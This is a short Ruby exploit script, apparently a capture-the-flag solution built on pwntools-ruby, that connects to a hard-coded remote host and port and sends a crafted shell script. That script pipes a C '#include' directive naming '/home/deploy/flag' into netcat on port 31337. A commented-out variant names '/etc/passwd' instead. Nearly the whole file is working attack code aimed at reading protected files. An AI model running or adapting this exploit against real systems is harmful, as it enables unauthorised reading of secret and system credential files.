#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '3.115.58.219', 9427
@local = false
@p = ''
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  # $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new(host, port)
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6'); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

# sc = "#!/bin/sh\necho 'stack address @ 0x12345678'; echo '1\n#include \"/etc/passwd\"@' | nc 0 31337\n"
sc = "#!/bin/sh\necho 'stack address @ 0x12345678'; echo '1\n#include \"/home/deploy/flag\"@' | nc 0 31337\n"
# sc = IO.binread('src/vuln')
z.gets "ELF"
z.puts sc.size
z.write sc
z.interact
